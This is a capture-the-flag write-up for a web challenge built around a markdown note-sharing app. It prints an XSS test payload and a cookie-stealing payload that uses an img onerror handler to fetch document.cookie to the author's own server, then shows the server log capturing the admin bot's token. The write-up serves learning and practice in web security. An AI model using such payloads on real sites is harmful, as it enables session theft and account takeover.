# Markdown

## Description
```
My friend made an app for sharing their notes!

App: https://markdown.web.actf.co/

Send them a link: https://admin-bot.actf.co/markdown
```

## Provided Files
```
- index.js
``` 

## Writeup

Starting off, we can assume that it's probably some kind of `XSS` because we need to use an `admin-bot`. <br/>
Visiting `https://markdown.web.actf.co/` reveals a markdown editor/viewer. <br/>
I have seen similar challenges where you could execute `XSS` through a html component which isn't porperly sanitized. <br/>

Using my default payload `<img src=1 onerror="alert(1)"/>` I tested it and got a working `XSS` payload. <br/>

Creating the payload below and using it on the admin-bot. <br/>
```html
<img src=1 onerror="fetch(`https://aryt3.dev/${document.cookie}`)"/>
```

My Server-Logs:
```sh
107.178.204.14 - - [26/May/2024:15:54:55 +0200] "GET /token=d15453b0234690ccbb91861e HTTP/1.1" 502 559 "https://markdown.web.actf.co/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/121.0.0.0 Safari/537.36"
```

Creating a cookie `token:d15453b0234690ccbb91861e` and navigating to `https://markdown.web.actf.co/flag` revealed the flag `actf{b534186fa8b28780b1fcd1e95e2a2e2c}` which concludes this writeup.